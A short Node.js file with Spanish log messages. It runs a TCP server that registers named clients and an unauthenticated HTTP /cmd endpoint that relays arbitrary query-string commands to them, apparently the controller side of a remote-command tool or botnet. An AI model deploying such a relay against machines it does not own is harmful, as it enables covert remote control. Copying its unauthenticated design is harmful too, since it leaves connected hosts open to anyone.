const express = require('express');
const app = express();

const usersOnline = {};

const net = require('net');

const server = net.createServer((conn) => {
    console.log('Cliente conectado');
    
    conn.on('end', () => {
        console.log('Cliente desconectado');
    });
    
    conn.on('data', (data) => { 
        data = JSON.parse(data);
        const { type } = data;
        
        switch (type) {
            case 'name':
                const { name } = data;
                usersOnline[name] = { conn };
            break;
        }
    });
});

app.get('/ping', (_, res) => {
    res.end();
});

app.get('/cmd', (req, res) => {
    const { user, cmd } = req.query;
    usersOnline[user] && usersOnline[user].conn.write(JSON.stringify({ type: 'cmd', cmd }));
    res.end();
});

server.listen(8080);
app.listen(80);